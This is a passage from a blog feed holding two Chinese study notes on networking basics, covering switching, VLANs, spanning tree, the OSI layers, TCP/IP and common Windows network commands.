    <link href="http://yoursite.com/2019/06/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93(%E4%BA%8C)/"/>
    <id>http://yoursite.com/2019/06/02/计算机网络总结(二)/</id>
    <published>2019-06-02T02:51:27.389Z</published>
    <updated>2019-06-02T15:26:16.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Switch-and-LAN"><a href="#Switch-and-LAN" class="headerlink" title="Switch and LAN"></a>Switch and LAN</h1><h2 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h2><ul><li>属于同一个网段的计算机需要用二层设备连接起来，早期是使用 Hub 连接</li><li>Hub 实现的是一种共享型的连接，就是多个网络设备接在一根网线上，平分带宽</li><li>Hub 实现的共享型网络，很容易产生冲突，只用于小型网络</li><li>一台主机发出的信号其他主机都能收到</li></ul><h2 id="Bridges"><a href="#Bridges" class="headerlink" title="Bridges"></a>Bridges</h2><ul><li>Operate at Layer 2 of the OSI model</li><li>Forward, filter, or flood frames</li><li>Have few ports</li><li>Are slow</li></ul><blockquote><p>网桥具有二层的隔离性和过滤功能</p><p>网桥可以互联多个网段，并具有过滤二层流量的能力(根据 MAC 信息)</p></blockquote><h2 id="Switches"><a href="#Switches" class="headerlink" title="Switches"></a>Switches</h2><ul><li>Operate at Layer 2 of the OSI model</li><li>Forward, filter, or flood frames</li><li>Have many ports</li><li>Are fast</li></ul><blockquote><p>交换机是硬件处理，网桥是软件处理</p></blockquote><h2 id="Multiple-Collision-Domains"><a href="#Multiple-Collision-Domains" class="headerlink" title="Multiple Collision Domains"></a>Multiple Collision Domains</h2><ul><li>交换机处理冲突的方式：Microsegmentation</li><li>每个接口都是一个独立的冲突域，每个终端设备都是一个独立的冲突域</li><li>基本上不会有冲突发生，也就不需要 CSMA/CD 技术</li></ul><h2 id="Switching-Frames"><a href="#Switching-Frames" class="headerlink" title="Switching Frames"></a>Switching Frames</h2><ul><li>交换机一个主要的功能就是根据桥接表对数据帧进行智能转发</li><li>桥接表中的每个接口都会有一个 MAC 地址，开机时为空</li><li>源主机向交换机发送数据帧，交换机会查找帧中的源 MAC 地址，并记录在桥接表对应的接口</li><li>交换机查找桥接表中目的 MAC 地址，如果没有就会进行一次泛洪( flooding )操作</li><li>目标主机可能会有一个返回帧，交换机查找帧中的源 MAC 地址，并记录在桥接表对应的接口</li></ul><blockquote><p>这里指的是单播，对于广播和组播会进行泛洪操作</p><p>flooding : 交换机对除了源接口以外所有接口，进行转发</p></blockquote><h2 id="Transmitting-Frames"><a href="#Transmitting-Frames" class="headerlink" title="Transmitting Frames"></a>Transmitting Frames</h2><p><strong>Cut-Through</strong></p><p>Switch checks destination address and immediately begins forwarding frame</p><blockquote><p>速度快，但是不可靠</p></blockquote><p><strong>Store and Forward</strong></p><p>Complete frame is received and checked before forwarding</p><blockquote><p>速度慢，但是可靠</p></blockquote><p><strong>Feagment-Free</strong></p><p>Switch checks the first 64 bytes, then immediately begins fowarding frame</p><blockquote><p>中等速度，中等可靠</p></blockquote><h1 id="VLAN-and-Trunks"><a href="#VLAN-and-Trunks" class="headerlink" title="VLAN and Trunks"></a>VLAN and Trunks</h1><h2 id="现代企业网络架构"><a href="#现代企业网络架构" class="headerlink" title="现代企业网络架构"></a>现代企业网络架构</h2><ul><li>一层：Campus Backbone</li><li>二层：Building Distribution</li><li>三层：Building Access</li></ul><h2 id="VLAN-Overview"><a href="#VLAN-Overview" class="headerlink" title="VLAN Overview"></a>VLAN Overview</h2><ul><li>Segmentation</li><li>Flexibility</li><li>Security</li></ul><p>VLAN = Broadcast Domain = Logical Network( Subnet )</p><blockquote><p>交换机是不隔离广播的，路由器隔离广播域</p><p>不同的 VLAN 需要使用三层设备进行通信</p><p>VLAN的划分是基于接口的</p></blockquote><h2 id="VLAN-Trunking"><a href="#VLAN-Trunking" class="headerlink" title="VLAN Trunking"></a>VLAN Trunking</h2><ul><li>允许在一根线路上承载多个 VLAN 的流量</li><li>Trunk的协议：802.1Q 和 ISL，任选一种对不同 VLAN 的流量进行标记</li><li>通常交换机间的接口都是 Trunk 接口</li></ul><h2 id="Trunking-with-ISL"><a href="#Trunking-with-ISL" class="headerlink" title="Trunking with ISL"></a>Trunking with ISL</h2><ul><li>Cisco proprietary protocol</li><li>Uses an encapsulation process</li><li>Does not modify the original frame</li></ul><blockquote><p>在原始帧上增加 30 字节的 ISL 头部</p></blockquote><h2 id="Trunking-with-802-1Q"><a href="#Trunking-with-802-1Q" class="headerlink" title="Trunking with 802.1Q"></a>Trunking with 802.1Q</h2><ul><li>IEEE standard</li><li>Adds a 4-byte tag to the original frame</li><li>Modify the original frame</li></ul><blockquote><p>需要重新计算尾部的 CRC 校验</p></blockquote><h1 id="VTP"><a href="#VTP" class="headerlink" title="VTP"></a>VTP</h1><h2 id="VTP-Features"><a href="#VTP-Features" class="headerlink" title="VTP Features"></a>VTP Features</h2><ul><li>简化大型 VLAN 的配置，实现了 VLAN 的集中化，动态的配置</li><li>使用 C/S 架构，是一个二层协议，只在 Trunk接口发送信息</li><li>定义一台 VTP 服务器，其他的交换机就是客户机，当 VLAN 信息修改时，VTP 服务器会自动在 Trunk接口发送通告，VTP 客户机也会跟着修改</li><li>具有 VTP 域划分功能，每个域有一个域名标识，每个域信息可以不一样</li></ul><h2 id="VTP-Modes"><a href="#VTP-Modes" class="headerlink" title="VTP Modes"></a>VTP Modes</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/20.png" alt></p><blockquote><p>默认为 Server 模式，且域名为空</p></blockquote><h2 id="VTP-Operation"><a href="#VTP-Operation" class="headerlink" title="VTP Operation"></a>VTP Operation</h2><ul><li>VTP advertisements are sent as multicast frames</li><li>VTP servers and clients are synchronized to the latest revision number</li><li>VTP advertisements are sent every 5 minutes or when there is a change</li></ul><blockquote><p>每个通告都会有一个版本号标识，客户端的版本号和服务端相同，高版本信息会抵消掉低版本信息</p></blockquote><h1 id="STP"><a href="#STP" class="headerlink" title="STP"></a>STP</h1><h2 id="Redundant-Topology"><a href="#Redundant-Topology" class="headerlink" title="Redundant Topology"></a>Redundant Topology</h2><ul><li>对于企业网，通常通过冗余线路提高网络可用性，使用冗余拓扑防止单点故障</li><li>只要有冗余路径就会存在环路，从而带来不好的问题，比如广播风暴，多帧拷贝，MAC 表不稳定</li></ul><h2 id="Broadcast-Storms"><a href="#Broadcast-Storms" class="headerlink" title="Broadcast Storms"></a>Broadcast Storms</h2><ul><li>泛洪的三种数据帧：未知的单播帧，广播帧，组播帧</li><li>数据帧会一直在线路中打转，直到所有的带宽被占满</li><li>由于广播风暴的存在，广播越少越好</li></ul><h2 id="Multiple-Frame-Copies"><a href="#Multiple-Frame-Copies" class="headerlink" title="Multiple Frame Copies"></a>Multiple Frame Copies</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/21.png" alt></p><blockquote><p>交换机刚启动时，MAC 表为空</p></blockquote><h2 id="MAC-Database-Instability"><a href="#MAC-Database-Instability" class="headerlink" title="MAC Database Instability"></a>MAC Database Instability</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/22.png" alt></p><blockquote><p>需要卡在一个刚好的时间点</p></blockquote><h2 id="Loop-Resolution-with-STP"><a href="#Loop-Resolution-with-STP" class="headerlink" title="Loop Resolution with STP"></a>Loop Resolution with STP</h2><ul><li>IEEE 802.1D 标准协议</li><li>从软件层检测环路，并禁用一个接口，当线路故障时再启用接口</li></ul><h2 id="Spanning-Tree-Operation"><a href="#Spanning-Tree-Operation" class="headerlink" title="Spanning-Tree Operation"></a>Spanning-Tree Operation</h2><ul><li>One <strong>root bridge</strong> per broadcast domain</li><li>One <strong>root port</strong> per nonroot bridge</li><li>One <strong>designated port</strong> per segment</li><li><strong>Nondesignated ports</strong> are unused</li></ul><blockquote><p>root bridge：集中化转发数据，通常时核心交换机</p><p>root port：到达根网桥最近的接口，带宽最高</p><p>Nondesignated ports：最终阻断的是非指定接口</p><p>先比较交换机的桥 ID，桥 ID 最小的成为根网桥，根网桥上的接口都是指定接口。然后根据带宽 和 cost 选取根端口，不一定直连就是根接口。最后桥 ID 最小的是指定接口，其余的是非指定接口</p></blockquote><h2 id="STP-Roor-Bridge-Selection"><a href="#STP-Roor-Bridge-Selection" class="headerlink" title="STP Roor Bridge Selection"></a>STP Roor Bridge Selection</h2><ul><li>BPDU：桥接协议数据单元，描述生成树相关信息</li><li>Bridge ID：唯一标识交换机，64位(=16+48)</li><li>Bridge Priority：默认32768，最大65535</li><li>Root bridge = bridge with the lowest bridge ID</li><li>Bridge ID = Bridge Priority + MAC Address</li></ul><blockquote><p>先比较交换机的桥 ID，再比较接口优先级，最后比较接口 ID</p></blockquote><h2 id="Bridge-Protocol-Data-Unit"><a href="#Bridge-Protocol-Data-Unit" class="headerlink" title="Bridge Protocol Data Unit"></a>Bridge Protocol Data Unit</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/23.png" alt></p><ul><li>Root ID : 根网桥 ID</li><li>Cost of path : 路径开销，选举根接口</li><li>Bridge ID : 本网桥 ID</li><li>Port ID : 接口 ID</li><li>Max age : 2个 BPDU 之间的时间间隔</li></ul><h2 id="Spanning-Tree-Path-Cost"><a href="#Spanning-Tree-Path-Cost" class="headerlink" title="Spanning-Tree Path Cost"></a>Spanning-Tree Path Cost</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/24.png" alt></p><h2 id="Spanning-Tree-Path-States"><a href="#Spanning-Tree-Path-States" class="headerlink" title="Spanning-Tree Path States"></a>Spanning-Tree Path States</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/25.png" alt></p><blockquote><p>Listening：进行角色重选取，默认15s</p><p>Learning：只学习 MAC，不转发</p><p>Blocking,Forwarding是终态，Listening,Learning是过渡状态</p></blockquote><h1 id="RSTP"><a href="#RSTP" class="headerlink" title="RSTP"></a>RSTP</h1><h2 id="RSTP-Features"><a href="#RSTP-Features" class="headerlink" title="RSTP Features"></a>RSTP Features</h2><ul><li>降低网络故障时间</li><li>协议编号 IEEE 802.1W</li></ul><h2 id="RSTP-Port-States"><a href="#RSTP-Port-States" class="headerlink" title="RSTP Port States"></a>RSTP Port States</h2><ul><li>Discarding：不转发数据，不学习 MAC 地址</li><li>Learning：不转发数据，学习 MAC 地址</li><li>Forwarding：转发数据，学习 MAC 地址</li></ul><blockquote><p>STP 中这些时间固定，但是 RSTP 中时间不固定</p></blockquote><h2 id="RSTP-Port-Roles"><a href="#RSTP-Port-Roles" class="headerlink" title="RSTP Port Roles"></a>RSTP Port Roles</h2><ul><li>Root Ports</li><li>Designated Ports</li><li>Alternative Port：备份 Root Ports</li><li>Backup Port：备份 Designated Ports</li></ul><blockquote><p>如果指定接口发生故障，备份接口之间转为指定接口，减少重选举时间</p></blockquote><h2 id="Edge-Ports"><a href="#Edge-Ports" class="headerlink" title="Edge Ports"></a>Edge Ports</h2><ul><li>这个接口直接接终端设备</li><li>与 Access Port( port fast) 相同</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Switch-and-LAN&quot;&gt;&lt;a href=&quot;#Switch-and-LAN&quot; class=&quot;headerlink&quot; title=&quot;Switch and LAN&quot;&gt;&lt;/a&gt;Switch and LAN&lt;/h1&gt;&lt;h2 id=&quot;Hub&quot;&gt;&lt;a href=&quot;#Hu
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(一)</title>
    <link href="http://yoursite.com/2019/06/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/06/02/计算机网络总结(一)/</id>
    <published>2019-06-02T02:44:15.396Z</published>
    <updated>2019-06-02T02:46:02.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h1><h2 id="A-Layered-Network-Model"><a href="#A-Layered-Network-Model" class="headerlink" title="A Layered Network Model"></a>A Layered Network Model</h2><ul><li>使用分层架构，每一个模块只负责自己特定的功能</li><li>不同模块之间定义标准化接口，实现每层的相互独立</li><li>TCP/IP协议就是基于OSI的一个实现</li></ul><h2 id="Physical"><a href="#Physical" class="headerlink" title="Physical"></a>Physical</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>Binary Transmission</p><ul><li>Defines the electrical, mechanical, procedural, and functional specifications for activating, maintaining, and deactivating the physical link</li></ul><blockquote><p>实现最基础的底层数据传输。定义底层传输的接口，传输的方式，传输的介质，传输的标准。数据怎么样通过介质传输，这些介质的定义，标准，全都由物理层决定。</p></blockquote><h3 id="Layer-1-Devices"><a href="#Layer-1-Devices" class="headerlink" title="Layer 1 Devices"></a>Layer 1 Devices</h3><ul><li>Layer 1 provides the physical media and its encoding</li><li>Examples<ul><li>Ethernet</li><li>Serial</li><li>Repeater</li><li>Physical interface of the NIC</li></ul></li></ul><h4 id="Network-Interface-Card"><a href="#Network-Interface-Card" class="headerlink" title="Network Interface Card"></a>Network Interface Card</h4><blockquote><p>不同的网卡实现的layer不同</p></blockquote><h4 id="Ethernet-Media"><a href="#Ethernet-Media" class="headerlink" title="Ethernet Media"></a>Ethernet Media</h4><p>Comparing Ethernet Media Requirements<br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/3.png" alt></p><blockquote><p>以太网传输介质分为有线和无线两种</p><p>数字代表传输速度，base代表基带传输(通信术语)，后面的部分代表传输介质。T代表铜质双绞线，F代表光纤</p><p>速度要求高，距离要求高时用光纤，一般的应用使用双绞线</p></blockquote><h4 id="Unshielded-Twisted-Pair-Cable"><a href="#Unshielded-Twisted-Pair-Cable" class="headerlink" title="Unshielded Twisted-Pair Cable"></a>Unshielded Twisted-Pair Cable</h4><ul><li>Speed and throughput: 10 to 1000 Mb/s</li><li>Another name: UTP</li><li>UTP Implementation: Straight-Through Cable and Crossover Cable</li></ul><blockquote><p>平行线连接不同的设备，交叉线连接相同的设备</p></blockquote><h4 id="Optical-Fiber"><a href="#Optical-Fiber" class="headerlink" title="Optical Fiber"></a>Optical Fiber</h4><ul><li>Single-mode Fiber: long transmission distance</li><li>Multi-mdoe Fiber: short transmission distance</li></ul><blockquote><p>光纤均为成对连接，连接时两端需对调</p><p>单模光纤：LX，多模光纤：SX</p></blockquote><h2 id="Data-Link"><a href="#Data-Link" class="headerlink" title="Data Link"></a>Data Link</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><p>Access to Media</p><ul><li>Defines how data is formatted for transmission and how access to the network is controlled</li><li>Provides error detection</li></ul><blockquote><p>定义数据的基本格式，数据如何在线缆上传输，怎么样进行标识，怎么样防止错误。控制如何去访问底层介质，以及差错检测。最主要的功能是MAC编址。</p></blockquote><h3 id="Layer-2-Devices"><a href="#Layer-2-Devices" class="headerlink" title="Layer 2 Devices"></a>Layer 2 Devices</h3><ul><li>Layer 2 devices provide an interface with physical media</li><li>Examples<ul><li>NIC</li><li>Bridge</li><li>Switch</li></ul></li></ul><h3 id="Local-Area-Network-LAN"><a href="#Local-Area-Network-LAN" class="headerlink" title="Local Area Network(LAN)"></a>Local Area Network(LAN)</h3><p>LAN Standards<br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/4.png" alt></p><blockquote><p>定义在 IEEE 802.2和802.3</p><p>LLC：负责二层与三层的通信</p><p>MAC：访问底层介质的控制</p></blockquote><h3 id="MAC-Address-Components"><a href="#MAC-Address-Components" class="headerlink" title="MAC Address Components"></a>MAC Address Components</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/5.png" alt></p><blockquote><p>OUI: 组织唯一标识符，标识生产厂商</p><p>Vendor Assigned: 厂商标识符，标识设备</p><p>前两位代表是广播地址还是组播地址，是本地还是全球</p><p>MAC地址不能修改，是写在 ROM 中的</p><p>在一个网段内，设备之间实际通过MAC地址通信</p></blockquote><h3 id="Ethernet-Frame-Structure"><a href="#Ethernet-Frame-Structure" class="headerlink" title="Ethernet Frame Structure"></a>Ethernet Frame Structure</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/6.png" alt></p><h3 id="Communicating-Within-the-LAN"><a href="#Communicating-Within-the-LAN" class="headerlink" title="Communicating Within the LAN"></a>Communicating Within the LAN</h3><ul><li>Unicast: one to one </li><li>Broadcast: one to all</li><li>Multicast: one to group</li></ul><blockquote><p>广播地址全为 1 </p><p>依靠 MAC 地址的格式区分类型</p></blockquote><h3 id="Collisions"><a href="#Collisions" class="headerlink" title="Collisions"></a>Collisions</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/7.png" alt></p><blockquote><p>在物理线缆上同时有两个电信号，引起冲突</p></blockquote><h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/8.png" alt></p><blockquote><p>在发送数据之前会先监听线路上是否有载波信号，如果有就代表线路上有人在传输信号，之后会通过一个回退算法等待一段时间，然后再去检测，直到线路上没有载波信号再发送数据</p><p>它是有线网络防止冲突的方式，它是被动监听</p></blockquote><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><blockquote><p>无线网络防止冲突的方式，它是主动检测</p><p>WLAN由802.11定义</p></blockquote><h3 id="Ethernet-Implementation"><a href="#Ethernet-Implementation" class="headerlink" title="Ethernet Implementation"></a>Ethernet Implementation</h3><ul><li>LAN</li><li>WLAN</li><li>…</li></ul><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>Data Delivery</p><ul><li>Routes data packets</li><li>Selects best path to deliver data</li><li>Provides logical addressing and path selection</li></ul><blockquote><p>主要是IP编址和路由功能</p></blockquote><h3 id="Flat-Topology"><a href="#Flat-Topology" class="headerlink" title="Flat Topology"></a>Flat Topology</h3><p>Problems</p><ul><li>所有设备在同一个广播域</li><li>设备定位查找困难</li><li>难以对设备区分应用策略</li></ul><blockquote><p>MAC地址是一个平面的编址方案，这样就会产生很多问题</p></blockquote><h3 id="Network-1"><a href="#Network-1" class="headerlink" title="Network"></a>Network</h3><ul><li>Smaller networks are easier to manage.</li><li>Overall traffic is reduced.</li><li>You can more easily apply network security policies.</li></ul><h3 id="Internet-Protocol-IP-Characteristics"><a href="#Internet-Protocol-IP-Characteristics" class="headerlink" title="Internet Protocol(IP) Characteristics"></a>Internet Protocol(IP) Characteristics</h3><ul><li>Hierarchical addressing</li><li>Operates at network layer of OSI</li><li>Connectionless protocol</li><li>Packets treated independently</li><li>Best-effort delivery</li><li>No data-recovery features</li></ul><blockquote><p>面向非连接协议，不论目标主机状态如何都可以发送数据进行通信</p><p>三层编址，实现IPv4(32bit)，实现connectionless的数据传输</p><p>允许对不同的数据包进行标记(QoS)</p></blockquote><h3 id="Routing-and-Router"><a href="#Routing-and-Router" class="headerlink" title="Routing and Router"></a>Routing and Router</h3><ul><li>路由器一般拥有多个接口，每个接口连接到一个网段，并且拥有该网段的一个IP地址，这个地址就是这个网段的网关IP地址</li><li>路由器通过不同方式维护一个路由表，路由器通过路由表的记录完成不同网段的数据转发(路由)功能</li><li>路由器具有在不同网络路径之间选择最优路径的功能</li><li>路由器具有隔离广播域的功能</li></ul><h3 id="IP-PDU-Header"><a href="#IP-PDU-Header" class="headerlink" title="IP PDU Header"></a>IP PDU Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/9.png" alt></p><blockquote><p>最大数据包长度65535</p><p>MTU最大传输单元，这是物理限制，一个接口单次传输数据最大传输多大，一般以太网为1500</p><p>Identification：标识是同一个数据包</p><p>Flag.Offset：当前分片所处的位置距离第一个偏移的位置</p><p>Time to Live：TTL，防止数据包在网络中无限传输，每经过一个三层设备，TTL-1</p><p>Protocol：实现多路复用，区分上层协议，不同上层协议这个数值不同</p><p>Header Checksum：检测在传输过程中是否被损坏</p></blockquote><h3 id="IP-Address-Classes"><a href="#IP-Address-Classes" class="headerlink" title="IP Address Classes"></a>IP Address Classes</h3><ul><li>A：网络部分8位</li><li>B：网络部分16位</li><li>C：网络部分24位</li><li>D：用于组播</li><li>E：保留使用</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/10.png" alt></p><blockquote><p>主机部分全为 0 代表一个网络，为网络地址</p><p>主机部分全为 1 代表一个广播，为广播地址</p></blockquote><h3 id="Private-IP-Addresses"><a href="#Private-IP-Addresses" class="headerlink" title="Private IP Addresses"></a>Private IP Addresses</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/11.png" alt></p><blockquote><p>私有地址不能出现在公网上</p></blockquote><h2 id="Transport"><a href="#Transport" class="headerlink" title="Transport"></a>Transport</h2><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h3><p>End-to-End COnnections</p><ul><li>Handles transportation issues between hosts</li><li>Ensures data transport reliability</li><li>Establishes, maintains, and terminals virtual circuits</li><li>Provides reliability through fault detection and recovery information flow control</li></ul><p>Transport Layer</p><ul><li>Session multiplexing</li><li>Segmentation</li><li>Flow control(when required)</li><li>Connection-oriented(when required)</li><li>Reliability(when required)</li></ul><blockquote><p>端到端通信的基本功能，TCP和UDP</p></blockquote><h3 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h3><ul><li>一个协议为多个上层协议提供统一服务</li><li>在TCP层使用端口号来区分不同的上层应用程序，范围0-65535</li></ul><blockquote><p>协议多路复用，不仅仅存在于传输层</p><p>端口号实现多路复用</p></blockquote><h3 id="Reliable-vs-Best-Effort-Comparision"><a href="#Reliable-vs-Best-Effort-Comparision" class="headerlink" title="Reliable vs. Best-Effort Comparision"></a>Reliable vs. Best-Effort Comparision</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/12.png" alt></p><h3 id="UDP-Characteristics"><a href="#UDP-Characteristics" class="headerlink" title="UDP Characteristics"></a>UDP Characteristics</h3><ul><li>Operates at transport layer of OSI and TCP/IP models</li><li>Provides applications with access to the network layer without the overhead of reliability mechanisms</li><li>Is a connectionless protocol</li><li>Provides limited error checking</li><li>Provides best-effort delivery</li><li>Has no data-recovery features</li></ul><h3 id="UDP-Header"><a href="#UDP-Header" class="headerlink" title="UDP Header"></a>UDP Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/13.png" alt></p><blockquote><p>所说的标准端口号，比如HTTP是80，FTP是20、21，这些端口号都是目标端口号，而源端口号是随机的</p><p>UDP报头是固定长度的</p></blockquote><h3 id="TCP-Characteristics"><a href="#TCP-Characteristics" class="headerlink" title="TCP Characteristics"></a>TCP Characteristics</h3><ul><li>Transport layer of the TCP/IP stack</li><li>Access to the network layer for applications</li><li>Connection-oriented protocol</li><li>Full-duplex mode operation</li><li>Error checking</li><li>Sequencing of data packets</li><li>Acknowledgement of recept</li><li>Data-recovery features</li></ul><blockquote><p>Full-duplex mode operation：TCP是双向连接，上行连接和下行连接</p></blockquote><h3 id="TCP-Header"><a href="#TCP-Header" class="headerlink" title="TCP Header"></a>TCP Header</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/14.png" alt></p><blockquote><p>状态标识：resv后面的内容</p><p>紧急指针：用于流控</p></blockquote><h3 id="Three-Way-Handshake"><a href="#Three-Way-Handshake" class="headerlink" title="Three-Way Handshake"></a>Three-Way Handshake</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/15.png" alt></p><ul><li>A 发送的 TCP Header 中状态位 SYN 置 1，协商初始序列号 100</li><li>B 发现序列号 100 已被使用，协商使用序列号 300，确认下一个想要收到的序列号 101</li><li>A 认为没有问题，就会继续发送一个 ACK，确认 301</li></ul><h3 id="Flow-Control"><a href="#Flow-Control" class="headerlink" title="Flow Control"></a>Flow Control</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/16.png" alt></p><blockquote><p>接收者没有资源去处理发送来的数据了，就会发送一个停止位，等到有资源去处理时再发送数据</p></blockquote><h3 id="Fixed-Windowing"><a href="#Fixed-Windowing" class="headerlink" title="Fixed Windowing"></a>Fixed Windowing</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/17.png" alt></p><blockquote><p>窗口大小为 3，发送三个数据包返回一个确认，增加传输效率</p><p>TCP sliding windowing，在通信过程中可以修改 window size 的大小</p></blockquote><h3 id="Mapping-Layer-3-to-Layer-4"><a href="#Mapping-Layer-3-to-Layer-4" class="headerlink" title="Mapping Layer 3 to Layer 4"></a>Mapping Layer 3 to Layer 4</h3><ul><li>三层到四层的映射是通过 IP 数据包报头的 protocol 字段完成的</li><li>UDP 和 TCP 对应的 protocol 字段的值不同</li></ul><h3 id="Mapping-Layer-4-to-Applications"><a href="#Mapping-Layer-4-to-Applications" class="headerlink" title="Mapping Layer 4 to Applications"></a>Mapping Layer 4 to Applications</h3><ul><li>四层到上层的映射是通过端口号</li></ul><blockquote><p>DNS 既可以使用 TCP 又可以使用 UDP</p></blockquote><h2 id="Session-Presentation-Application"><a href="#Session-Presentation-Application" class="headerlink" title="Session Presentation Application"></a>Session Presentation Application</h2><blockquote><p>统一称为应用层，由应用控制</p></blockquote><h1 id="Data-Encapsulation"><a href="#Data-Encapsulation" class="headerlink" title="Data Encapsulation"></a>Data Encapsulation</h1><ul><li>Data Encapsulation</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/1.jpg" alt></p><ul><li>Peer-to-Peer Communication</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/2.jpg" alt></p><blockquote><p>数据封装，解封装为其逆过程</p><p>数据包在不同的分成有不同的名称。段，包，帧，比特流</p></blockquote><h1 id="Packet-Delivery"><a href="#Packet-Delivery" class="headerlink" title="Packet Delivery"></a>Packet Delivery</h1><h2 id="Host-to-Host-Packet-Delivery-同网段"><a href="#Host-to-Host-Packet-Delivery-同网段" class="headerlink" title="Host-to-Host Packet Delivery(同网段)"></a>Host-to-Host Packet Delivery(同网段)</h2><ul><li>源目标主机属于同一网段</li><li>源主机使用 IP 地址封装三层信息，并传递给二层</li><li>二层查询本机 ARP 表，发现没有目标主机的 MAC 地址记录，则通过 ARP 协议查询目标主机 MAC 地址</li><li>通过 ARP 协议获取到目标主机 MAC 地址后，通过 MAC 地址封装二层信息，并传递给物理层发送给目标</li></ul><h2 id="Host-to-Host-Packet-Delivery-不同网段"><a href="#Host-to-Host-Packet-Delivery-不同网段" class="headerlink" title="Host-to-Host Packet Delivery(不同网段)"></a>Host-to-Host Packet Delivery(不同网段)</h2><ul><li>源目标主机属于不同网段，所以需要将数据发给本网网关进行转发</li><li>源主机使用 IP 地址封装三层信息，并传递给二层</li><li>二层查询本机 ARP 表，发现没有目标主机的 MAC 地址记录，则通过 ARP 协议查询网关 MAC 地址</li><li>通过 ARP 协议获取到网关 MAC 地址后，通过 MAC 地址封装二层信息，并传递给物理层发送给网关</li></ul><h1 id="Network-Command"><a href="#Network-Command" class="headerlink" title="Network Command"></a>Network Command</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><ul><li>-t  持续 ping 目标主机直到接收到停止信号</li><li>-a  将目标主机解析成主机名</li><li>-n  对目标主机 ping 的次数</li><li>-l  ping 包的大小</li><li>-f  设置 IP 包的 DF 值<blockquote><p>使用 ICMP 协议</p><p>DF：不进行分片</p></blockquote></li></ul><h2 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h2><ul><li>/all          显示所有适配器的TCP/IP配置</li><li>/renew        更新适配器DHCP配置</li><li>/release      更新DHCP租约期</li><li>/displaydns   显示DNS缓存信息</li></ul><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><ul><li>-querytype    DNS 查询</li></ul><h2 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h2><ul><li>-a   显示所有ARP信息</li><li>-s   绑定静态ARP</li><li>-d   删除ARP信息</li></ul><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><ul><li>-a   显示所有连接及监听端口</li><li>-e   显示以太网信息</li><li>-n   不进行IP到主机名的解析</li><li>-p   只显示指定的协议</li><li>-s   显示每个协议的状态</li></ul><h1 id="Understanding-VLSM"><a href="#Understanding-VLSM" class="headerlink" title="Understanding VLSM"></a>Understanding VLSM</h1><h2 id="Subnetting-Review"><a href="#Subnetting-Review" class="headerlink" title="Subnetting Review"></a>Subnetting Review</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/18.png" alt></p><blockquote><p>IP = network + subnets + host</p></blockquote><h2 id="What-a-Subnet-Mask-does"><a href="#What-a-Subnet-Mask-does" class="headerlink" title="What a Subnet Mask does"></a>What a Subnet Mask does</h2><ul><li>Tells the router the number of bits to look at when routing</li><li>Defines the number of bits that are significant</li><li>Used as a measuring tool, not to hide anything</li></ul><blockquote><p>比如，IP 